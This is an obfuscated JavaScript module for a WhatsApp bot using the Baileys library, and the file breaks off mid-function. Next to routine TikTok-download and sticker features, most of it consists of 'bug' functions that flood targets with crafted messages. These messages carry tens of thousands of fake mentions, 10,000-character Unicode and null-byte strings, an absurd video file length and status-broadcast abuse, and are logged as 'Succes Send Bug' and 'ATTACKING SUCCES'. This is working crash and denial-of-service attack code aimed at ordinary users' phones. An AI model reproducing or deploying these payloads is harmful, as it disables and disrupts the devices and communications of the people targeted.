require("../settings/config");
const {
  default: baileys,
  proto,
  jidNormalizedUser,
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType,
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const {
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  makeInMemoryStore,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediariyuInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisriyuectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const util = require('util');
const chalk = require("chalk");
const axios = require('axios');
const sharp = require("sharp");
const moment = require("moment-timezone");
const {
  smsg,
  tanggal,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
  generateProfilePicture
} = require('../system/storage');
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  addExif
} = require("../system/exif.js");
const babi = fs.readFileSync("./system/image/Hot.jpeg");
module.exports = client = async (_0x51cce1, _0x4cca1e, _0x4ae87e, _0x4799a) => {
  try {
    const _0x2700cc = _0x4cca1e.mtype === "conversation" ? _0x4cca1e.message.conversation : _0x4cca1e.mtype === 'extendedTextMessage' ? _0x4cca1e.message.extendedTextMessage.text : _0x4cca1e.mtype === "imageMessage" ? _0x4cca1e.message.imageMessage.caption : _0x4cca1e.mtype === 'videoMessage' ? _0x4cca1e.message.videoMessage.caption : _0x4cca1e.mtype === 'documentMessage' ? _0x4cca1e.message.documentMessage.caption || '' : _0x4cca1e.mtype === "audioMessage" ? _0x4cca1e.message.audioMessage.caption || '' : _0x4cca1e.mtype === "stickerMessage" ? _0x4cca1e.message.stickerMessage.caption || '' : _0x4cca1e.mtype === "buttonsResponseMessage" ? _0x4cca1e.message.buttonsResponseMessage.selectedButtonId : _0x4cca1e.mtype === "listResponseMessage" ? _0x4cca1e.message.listResponseMessage.singleSelectReply.selectedRowId : _0x4cca1e.mtype === 'templateButtonReplyMessage' ? _0x4cca1e.message.templateButtonReplyMessage.selectedId : _0x4cca1e.mtype === "interactiveResponseMessage" ? JSON.parse(_0x4cca1e.msg.nativeFlowResponseMessage.paramsJson).id : _0x4cca1e.mtype === "messageContextInfo" ? _0x4cca1e.message.buttonsResponseMessage?.['selectedButtonId'] || _0x4cca1e.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x4cca1e.text : _0x4cca1e.mtype === "reactionMessage" ? _0x4cca1e.message.reactionMessage.text : _0x4cca1e.mtype === "contactMessage" ? _0x4cca1e.message.contactMessage.displayName : _0x4cca1e.mtype === "contactsArrayMessage" ? _0x4cca1e.message.contactsArrayMessage.contacts.map(_0x58c259 => _0x58c259.displayName).join(", ") : _0x4cca1e.mtype === "locationMessage" ? _0x4cca1e.message.locationMessage.degreesLatitude + ", " + _0x4cca1e.message.locationMessage.degreesLongitude : _0x4cca1e.mtype === 'liveLocationMessage' ? _0x4cca1e.message.liveLocationMessage.degreesLatitude + ", " + _0x4cca1e.message.liveLocationMessage.degreesLongitude : _0x4cca1e.mtype === 'pollCreationMessage' ? _0x4cca1e.message.pollCreationMessage.name : _0x4cca1e.mtype === "pollUpdateMessage" ? _0x4cca1e.message.pollUpdateMessage.name : _0x4cca1e.mtype === 'groupInviteMessage' ? _0x4cca1e.message.groupInviteMessage.groupJid : _0x4cca1e.mtype === "viewOnceMessage" ? _0x4cca1e.message.viewOnceMessage.message.imageMessage?.["caption"] || _0x4cca1e.message.viewOnceMessage.message.videoMessage?.["caption"] || "[Pesan sekali lihat]" : _0x4cca1e.mtype === 'viewOnceMessageV2' ? _0x4cca1e.message.viewOnceMessageV2.message.imageMessage?.["caption"] || _0x4cca1e.message.viewOnceMessageV2.message.videoMessage?.["caption"] || "[Pesan sekali lihat]" : _0x4cca1e.mtype === 'viewOnceMessageV2Extension' ? _0x4cca1e.message.viewOnceMessageV2Extension.message.imageMessage?.['caption'] || _0x4cca1e.message.viewOnceMessageV2Extension.message.videoMessage?.["caption"] || "[Pesan sekali lihat]" : _0x4cca1e.mtype === "ephemeralMessage" ? _0x4cca1e.message.ephemeralMessage.message.conversation || _0x4cca1e.message.ephemeralMessage.message.extendedTextMessage?.['text'] || "[Pesan sementara]" : _0x4cca1e.mtype === "interactiveMessage" ? "[Pesan interaktif]" : _0x4cca1e.mtype === "protocolMessage" ? "[Pesan telah dihapus]" : '';
    const _0x420994 = typeof _0x4cca1e.text == "string" ? _0x4cca1e.text : '';
    const _0x59a112 = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x2700cc) ? _0x2700cc.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : global.prefa ?? global.prefix;
    const _0xea27b1 = JSON.parse(fs.readFileSync('./system/owner.json'));
    const _0xec9c72 = JSON.parse(fs.readFileSync("./system/premium.json"));
    const _0x44eeee = _0x2700cc.startsWith(_0x59a112) ? _0x2700cc.slice(_0x59a112.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x632862 = _0x2700cc.trim().split(/ +/).slice(0x1);
    const _0x41cb09 = await _0x51cce1.decodeJid(_0x51cce1.user.id);
    const _0x1ad0af = [_0x41cb09, ..._0xea27b1].map(_0x580636 => _0x580636.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x4cca1e.sender);
    const _0x545fcd = [_0x41cb09, ..._0xec9c72].map(_0x4dff46 => _0x4dff46.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x4cca1e.sender);
    const _0x1b3cb5 = q = _0x632862.join(" ");
    const _0x530003 = _0x4cca1e.quoted ? _0x4cca1e.quoted : _0x4cca1e;
    const _0x2c6203 = mek.key.remoteJid;
    const {
      spawn: _0x4454a7,
      exec: _0x20ff07
    } = require("child_process");
    const _0x44749f = _0x4cca1e.isGroup ? await _0x51cce1.groupMetadata(_0x2c6203)["catch"](_0x156518 => {}) : '';
    const _0x125d70 = _0x4cca1e.isGroup ? _0x44749f.subject : '';
    const _0xa15334 = _0x4cca1e.pushName || "No Name";
    const _0x7b6e81 = moment(Date.now()).tz('Asia/Jakarta').locale('id').format("HH:mm:ss z");
    const _0x4c2872 = (_0x530003.msg || _0x530003).mimetype || '';
    const _0x514173 = new Date().toLocaleDateString("id-ID", {
      'timeZone': "Asia/Jakarta",
      'year': "numeric",
      'month': "long",
      'day': "numeric"
    });
    if (!_0x51cce1["public"]) {
      if (!_0x1ad0af) {
        return;
      }
    }
    if (_0x44eeee) {
      if (_0x4cca1e.isGroup) {
        console.log(chalk.bgBlue.white.bold("━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━"));
        console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(" 📅 Date : " + _0x514173 + " \n" + (" 🕐 Clock : " + _0x7b6e81 + " \n") + (" 💬 Message Received : " + _0x44eeee + " \n") + (" 🌐 Group Name : " + _0x125d70 + " \n") + (" 🔑 Group Id : " + _0x4cca1e.chat + " \n") + (" 👤 Recipient : " + _0x41cb09 + " \n")));
      } else {
        console.log(chalk.bgBlue.white.bold("━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━"));
        console.log(chalk.bgHex("#C51077").hex("#ffffff").bold(" 📅 Date : " + _0x514173 + " \n" + (" 🕐 Clock : " + _0x7b6e81 + " \n") + (" 💬 Message Received : " + _0x44eeee + " \n") + (" 🗣️ Sender : " + _0xa15334 + " \n") + " 🌐 Group Name : No In Group \n" + " 🔑 Group Id : No In Group \n" + (" 👤 Recipient : " + _0x41cb09 + " \n")));
      }
    }
    async function _0x19be17(_0xc4bc19) {
      return new Promise(async (_0x16edb2, _0x3e2382) => {
        try {
          let _0x3e73a5 = [];
          function _0x16ea9c(_0x8ab14c) {
            let _0x22a524 = parseInt(_0x8ab14c);
            return Number(_0x22a524).toLocaleString().replace(/,/g, '.');
          }
          function _0x16043e(_0x4afdd5, _0x187ff6 = 'en') {
            let _0x4b8c83 = new Date(_0x4afdd5);
            return _0x4b8c83.toLocaleDateString(_0x187ff6, {
              'weekday': "long",
              'day': "numeric",
              'month': 'long',
              'year': 'numeric',
              'hour': "numeric",
              'minute': "numeric",
              'second': 'numeric'
            });
          }
          let _0x20d065 = await (await axios.post('https://www.tikwm.com/api/', {}, {
            'headers': {
              'Accept': "application/json, text/javascript, */*; q=0.01",
              'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
              'Origin': "https://www.tikwm.com",
              'Referer': "https://www.tikwm.com/",
              'Sec-Ch-Ua': "\"Not)A;Brand\" ;v=\"24\" , \"Chromium\" ;v=\"116\"",
              'Sec-Ch-Ua-Mobile': '?1',
              'Sec-Ch-Ua-Platform': "Android",
              'Sec-Fetch-Dest': "empty",
              'Sec-Fetch-Mode': "cors",
              'Sec-Fetch-Site': "same-origin",
              'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
              'X-Requested-With': "XMLHttpRequest"
            },
            'params': {
              'url': _0xc4bc19,
              'count': 0xc,
              'cursor': 0x0,
              'web': 0x1,
              'hd': 0x1
            }
          })).data.data;
          if (_0x20d065?.["duration"] == 0x0) {
            _0x20d065.images.map(_0xfe0aa0 => {
              _0x3e73a5.push({
                'type': "photo",
                'url': _0xfe0aa0
              });
            });
          } else {
            _0x3e73a5.push({
              'type': 'watermark',
              'url': 'https://www.tikwm.com' + _0x20d065?.['wmplay'] || '/undefined'
            }, {
              'type': "nowatermark",
              'url': "https://www.tikwm.com" + _0x20d065?.['play'] || '/undefined'
            }, {
              'type': "nowatermark_hd",
              'url': "https://www.tikwm.com" + _0x20d065?.['hdplay'] || "/undefined"
            });
          }
          let _0x380b1c = {
            'status': true,
            'title': _0x20d065.title,
            'taken_at': _0x16043e(_0x20d065.create_time).replace('1970', ''),
            'region': _0x20d065.region,
            'id': _0x20d065.id,
            'durations': _0x20d065.duration,
            'duration': _0x20d065.duration + " Seconds",
            'cover': "https://www.tikwm.com" + _0x20d065.cover,
            'size_wm': _0x20d065.wm_size,
            'size_nowm': _0x20d065.size,
            'size_nowm_hd': _0x20d065.hd_size,
            'data': _0x3e73a5,
            'music_info': {
              'id': _0x20d065.music_info.id,
              'title': _0x20d065.music_info.title,
              'author': _0x20d065.music_info.author,
              'album': _0x20d065.music_info.album ? _0x20d065.music_info.album : null,
              'url': 'https://www.tikwm.com' + _0x20d065.music || _0x20d065.music_info.play
            },
            'stats': {
              'views': _0x16ea9c(_0x20d065.play_count),
              'likes': _0x16ea9c(_0x20d065.digg_count),
              'comment': _0x16ea9c(_0x20d065.comment_count),
              'share': _0x16ea9c(_0x20d065.share_count),
              'download': _0x16ea9c(_0x20d065.download_count)
            },
            'author': {
              'id': _0x20d065.author.id,
              'fullname': _0x20d065.author.unique_id,
              'nickname': _0x20d065.author.nickname,
              'avatar': 'https://www.tikwm.com' + _0x20d065.author.avatar
            }
          };
          _0x16edb2(_0x380b1c);
        } catch (_0xedc7f6) {}
      });
    }
    async function _0x5c77a3(_0xffc4d0, _0x58032d, _0x4fc923) {
      try {
        let _0x48e2e9;
        if (_0xffc4d0.startsWith('data:')) {
          const _0x440996 = _0xffc4d0.split(',')[0x1];
          _0x48e2e9 = Buffer.from(_0x440996, "base64");
        } else {
          const _0x1f1b0e = await axios.get(_0xffc4d0, {
            'responseType': "arraybuffer"
          });
          _0x48e2e9 = Buffer.from(_0x1f1b0e.data, "binary");
        }
        const _0x4af2a1 = await sharp(_0x48e2e9).resize(0x200, 0x200, {
          'fit': "contain",
          'background': {
            'r': 0xff,
            'g': 0xff,
            'b': 0xff,
            'alpha': 0x0
          }
        }).webp({
          'quality': 0x46
        }).toBuffer();
        const _0x43a10b = await addExif(_0x4af2a1, global.packname, global.author);
        const _0x7267be = '' + Math.floor(Math.random() * 0x2710) + '.webp';
        fs.writeFileSync(_0x7267be, _0x4af2a1);
        await _0x58032d.sendMessage(_0x4fc923.chat, {
          'sticker': _0x43a10b,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️",
              'body': "☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡",
              'mediaType': 0x3,
              'renderLargerThumbnail': false,
              'thumbnailUrl': "https://j.top4top.io/p_3334tid4e0.jpg",
              'sourceUrl': 'https://github.com/clientModders'
            }
          }
        }, {
          'quoted': _0x4fc923
        });
        fs.unlinkSync(_0x7267be);
      } catch (_0x3d54be) {
        console.error("Error creating sticker:", _0x3d54be);
        _0x4fc923.reply("Terjadi kesalahan saat membuat stiker. Coba lagi nanti.");
      }
    }
    const _0x1bd3dc = _0x26cfa7 => {
      const _0x3660c3 = [{
        'buttonId': ".menu",
        'buttonText': {
          'displayText': "𝐛̶𝐚͠𝐜͜𝐤"
        }
      }];
      const _0x76f1de = {
        'image': {
          'url': "https://img1.pixhost.to/images/6432/610252420_decode-barmodss.jpg"
        },
        'caption': _0x26cfa7,
        'footer': "☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡",
        'buttons': _0x3660c3,
        'headerType': 0x6,
        'contextInfo': {
          'forwardingScore': 0x1869f,
          'isForwarded': true,
          'forwardedNewsletterMessageInfo': {
            'newsletterJid': "120363400890914613@newsletter",
            'serverMessageId': null,
            'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
          },
          'mentionedJid': ["13135550002@s.whatsapp.net"]
        },
        'viewOnce': true
      };
      return _0x51cce1.sendMessage(_0x4cca1e.chat, _0x76f1de, {
        'quoted': _0x361743
      });
    };
    const _0x361743 = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': "status@broadcast"
      },
      'message': {
        'orderMessage': {
          'orderId': "2009",
          'thumbnail': babi,
          'itemCount': "9999",
          'status': "INQUIRY",
          'surface': '',
          'message': "𝐓𝐡͠𝐮͜𝐧̶𝐝𝐞𝐫̋͢𝐇͜𝐞𝐥͠𝐥𝐞𝐧̶𝐢̋͢𝐜⚡",
          'token': "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      'contextInfo': {
        'mentionedJid': ['120363369514105242@s.whatsapp.net'],
        'forwardingScore': 0x3e7,
        'isForwarded': true
      }
    };
    const _0x41bad0 = _0x4cca1e.pushName || "No Name";
    async function _0x3834bd(_0x130970, _0x5eb456, _0x4a625c) {
      if (!_0x130970) {
        throw new Error("No target number provided");
      }
      const _0x3aa93d = "*☇𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉*\n*𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : " + _0x130970 + "*\n*𖥂 𝐏𝐞𝐦𝐢𝐧𝐭𝐚 : " + _0x41bad0 + "*\n*𖥂 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 : " + _0x44eeee + "*\n*® 𝐓𝐡𝐞 𝐑𝐚𝐩𝐩𝐥𝐢𝐌𝐨𝐝𝐬*\n";
      const _0x3f2b93 = await generateWAMessageFromContent(_0x5eb456.chat, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x3aa93d
              },
              'footer': {
                'text': ''
              },
              'header': {
                'title': '',
                'subtitle': '',
                'hasMediaAttachment': false
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': JSON.stringify({
                    'display_text': "𝗖𝗲𝗸 𝗡𝗼𝗺𝗼𝗿 𝗧𝗮𝗿𝗴𝗲𝘁",
                    'url': "https://wa.me/" + _0x130970.replace("@s.whatsapp.net", ''),
                    'merchant_url': "https://wa.me/9918731993"
                  })
                }, {
                  'name': 'cta_url',
                  'buttonParamsJson': JSON.stringify({
                    'display_text': "𝗖𝗵𝗮𝗻𝗻𝗲𝗹",
                    'url': "https://whatsapp.com/channel/0029Vb7s9ZzAjPXKaS0lP63m",
                    'merchant_url': "https://whatsapp.com/channel/0029Vb7s9ZzAjPXKaSOUr63m"
                  })
                }]
              },
              'contextInfo': {
                'mentionedJid': [_0x5eb456.sender]
              }
            }
          }
        }
      }, {
        'quoted': _0x361743
      });
      await _0x4a625c.relayMessage(_0x5eb456.chat, _0x3f2b93.message, {
        'messageId': _0x3f2b93.key.id
      });
    }
    async function _0x50422f(_0x28f6ba, _0x68160f) {
      const _0x913ba = ["[█░░░░░░░░░] 10%", "[███░░░░░░░] 30%", "[█████░░░░░] 50%", "[███████░░░] 70%", "[█████████░] 90%", "[██████████] 100%"];
      const _0x23187a = await _0x68160f.sendMessage(_0x28f6ba, {
        'text': _0x913ba[0x0]
      });
      for (let _0x526cec = 0x1; _0x526cec < _0x913ba.length; _0x526cec++) {
        await new Promise(_0x13bf95 => setTimeout(_0x13bf95, 0x14d));
        await _0x68160f.sendMessage(_0x28f6ba, {
          'text': _0x913ba[_0x526cec],
          'edit': _0x23187a.key
        });
      }
    }
    async function _0x8978fe(_0x1ebdd1, _0x242151) {
      const _0x8c3075 = {
        'image': babi,
        'caption': "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
      };
      const _0x520d71 = await generateWAMessageFromContent(_0x1ebdd1, {
        'albumMessage': {
          'expectedImageCount': 0x29a,
          'expectedVideoCount': 0x0
        }
      }, {
        'userJid': _0x1ebdd1,
        'upload': _0x51cce1.waUploadToServer
      });
      await _0x51cce1.relayMessage(_0x1ebdd1, _0x520d71.message, {
        'messageId': _0x520d71.key.id
      });
      for (let _0x32690f = 0x0; _0x32690f < 0x29a; _0x32690f++) {
        const _0x464d3e = await generateWAMessage(_0x1ebdd1, _0x8c3075, {
          'upload': _0x51cce1.waUploadToServer
        });
        const _0x4f6fe9 = Object.keys(_0x464d3e.message).find(_0x1c21f3 => _0x1c21f3.endsWith("Message"));
        _0x464d3e.message[_0x4f6fe9].contextInfo = {
          'mentionedJid': ["13135550002@s.whatsapp.net", ...Array.from({
            'length': 0x7530
          }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
          'participant': "0@s.whatsapp.net",
          'remoteJid': "status@broadcast",
          'forwardedNewsletterMessageInfo': {
            'newsletterName': "Tama Ryuichi | I'm Beginner",
            'newsletterJid': "0@newsletter",
            'serverMessageId': 0x1
          },
          'messageAssociation': {
            'associationType': 0x1,
            'parentMessageKey': _0x520d71.key
          }
        };
        await _0x51cce1.relayMessage('status@broadcast', _0x464d3e.message, {
          'messageId': _0x464d3e.key.id,
          'statusJidList': [_0x1ebdd1],
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {},
            'content': [{
              'tag': 'mentioned_users',
              'attrs': {},
              'content': [{
                'tag': 'to',
                'attrs': {
                  'jid': _0x1ebdd1
                },
                'content': undefined
              }]
            }]
          }]
        });
        if (_0x242151) {
          await _0x51cce1.relayMessage(_0x1ebdd1, {
            'statusMentionMessage': {
              'message': {
                'protocolMessage': {
                  'key': _0x464d3e.key,
                  'type': 0x19
                }
              }
            }
          }, {
            'additionalNodes': [{
              'tag': "meta",
              'attrs': {
                'is_status_mention': "true"
              },
              'content': undefined
            }]
          });
        }
      }
    }
    async function _0x21a81d(_0x5af354, _0x52778b) {
      console.log(chalk.red("Succes Send Bug"));
      const _0xbeb70a = {
        'viewOnceMessage': {
          'message': {
            'imageMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              'mimetype': 'image/jpeg',
              'caption': "⨭͠☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️",
              'fileSha256': 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=',
              'fileLength': "19769",
              'height': 0x162,
              'width': 0x30f,
              'mediaKey': "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              'fileEncSha256': 'LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=',
              'directPath': "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              'mediaKeyTimestamp': "1743225419",
              'jpegThumbnail': null,
              'scansSidecar': 'mh5/YmcAWyLt5H2qzY3NtHrEtyM=',
              'scanLengths': [0x985, 0x43b4],
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x895440) + "@s.whatsapp.net"),
                'isSampled': true,
                'participant': _0x5af354,
                'fromMe': true,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x260d,
                'isForwarded': true
              }
            }
          }
        }
      };
      const _0x18f8c1 = generateWAMessageFromContent(_0x5af354, _0xbeb70a, {});
      await _0x51cce1.relayMessage("status@broadcast", _0x18f8c1.message, {
        'messageId': _0x18f8c1.key.id,
        'statusJidList': [_0x5af354],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x5af354
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x52778b) {
        await _0x51cce1.relayMessage(_0x5af354, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x18f8c1.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': '⨭͛͠𝐙𝐄̶͓𝐃̷𝐄͡𝐙͍̽𝐀͡𝐃𝐀'
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x33e122(_0x5a98b4) {
      try {
        const _0x123457 = await prepareWAMessageMedia({
          'image': {
            'url': 'https://files.catbox.moe/cfkh9x.jpg',
            'gifPlayback': true
          }
        }, {
          'upload': _0x51cce1.waUploadToServer,
          'mediaType': "image"
        });
        const _0x46de39 = generateWAMessageFromContent(_0x5a98b4, proto.Message.fromObject({
          'interactiveMessage': {
            'contextInfo': {
              'mentionedJid': Array.from({
                'length': 0x7530
              }, () => '1' + Math.floor(Math.random() * 0x895440) + "@s.whatsapp.net"),
              'isForwarded': true,
              'forwardingScore': 0x270f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': '120363331859075083@newsletter',
                'newsletterName': 'ꦾ'.repeat(0x2710),
                'serverMessageId': 0x1
              }
            },
            'header': {
              'title': "⨭͠☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡",
              ..._0x123457,
              'hasMediaAttachment': true
            },
            'body': {
              'text': '⁣'.repeat(0x2710)
            },
            'footer': {
              'text': ''
            },
            'nativeFlowMessage': {
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': JSON.stringify({
                  'display_text': 'ꦾ'.repeat(0x2710),
                  'url': 'ꦾ'.repeat(0x2710),
                  'merchant_url': ''
                })
              }, {
                'name': "galaxy_message",
                'buttonParamsJson': JSON.stringify({
                  'screen_1_TextInput_0': "radio" + "\0".repeat(0x2710),
                  'screen_0_Dropdown_1': "Null",
                  'flow_token': 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.'
                }),
                'version': 0x3
              }]
            }
          }
        }), {
          'quoted': null
        });
        _0x46de39.key.remoteJid = _0x5a98b4;
        _0x46de39.key.fromMe = false;
        _0x46de39.key.id = Math.random().toString(0x24).slice(0x2) + Date.now();
        await _0x51cce1.relayMessage(_0x5a98b4, _0x46de39.message, {
          'messageId': _0x46de39.key.id
        });
        console.log("TravasBlank Delay Send To " + _0x5a98b4);
      } catch (_0x127985) {
        console.error("Error in BlankScreen:", _0x127985);
      }
    }
    async function _0x57dfc3(_0x2efee6) {
      try {
        const _0x48460b = await prepareWAMessageMedia({
          'image': {
            'url': "https://files.catbox.moe/cfkh9x.jpg",
            'gifPlayback': true
          }
        }, {
          'upload': _0x51cce1.waUploadToServer,
          'mediaType': 'image'
        });
        const _0x1a2367 = generateWAMessageFromContent(_0x2efee6, proto.Message.fromObject({
          'interactiveMessage': {
            'contextInfo': {
              'mentionedJid': Array.from({
                'length': 0x7530
              }, () => '1' + Math.floor(Math.random() * 0x895440) + "@s.whatsapp.net"),
              'isForwarded': true,
              'forwardingScore': 0x270f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363331859075083@newsletter",
                'newsletterName': 'ꦾ'.repeat(0x2710),
                'serverMessageId': 0x1
              }
            },
            'header': {
              'title': '⨭͠☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡',
              ..._0x48460b,
              'hasMediaAttachment': true
            },
            'body': {
              'text': '⁣'.repeat(0x2710)
            },
            'footer': {
              'text': ''
            },
            'nativeFlowMessage': {
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': JSON.stringify({
                  'display_text': 'ꦾ'.repeat(0x2710),
                  'url': 'ꦾ'.repeat(0x2710),
                  'merchant_url': ''
                })
              }, {
                'name': "galaxy_message",
                'buttonParamsJson': JSON.stringify({
                  'screen_1_TextInput_0': "radio" + "\0".repeat(0x2710),
                  'screen_0_Dropdown_1': "Null",
                  'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                'version': 0x3
              }]
            }
          }
        }), {
          'quoted': null
        });
        await _0x51cce1.relayMessage(_0x2efee6, _0x1a2367.message, {
          'messageId': _0x1a2367.key.id
        });
        console.log("TravasBlank Delay Send To " + _0x2efee6);
      } catch (_0x129f56) {
        console.error("Error in BlankScreen:", _0x129f56);
      }
    }
    async function _0x19c35f(_0x692f8a, _0x806711) {
      const _0x51fdb1 = {
        'url': "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        'mimetype': "video/mp4",
        'fileSha256': "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        'fileLength': '109951162777600',
        'seconds': 0x1869f,
        'mediaKey': "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        'caption': '᭯'.repeat(0x262b),
        'height': 0x280,
        'width': 0x280,
        'fileEncSha256': "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        'directPath': '/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0',
        'mediaKeyTimestamp': "1743848703",
        'contextInfo': {
          'isSampled': true,
          'fromMe': true,
          'mentionedJid': ["13135550002@s.whatsapp.net", ...Array.from({
            'length': 0x9c40
          }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")]
        },
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': "120363330344810280@newsletter",
          'serverMessageId': 0x1,
          'newsletterName': 'ٯ'.repeat(0x64)
        },
        'streamingSidecar': "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        'thumbnailDirectPath': '/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0',
        'thumbnailSha256': "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        'thumbnailEncSha256': 'fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=',
        'annotations': [{
          'embeddedContent': {
            'musicContentMediaId': '589608164114571',
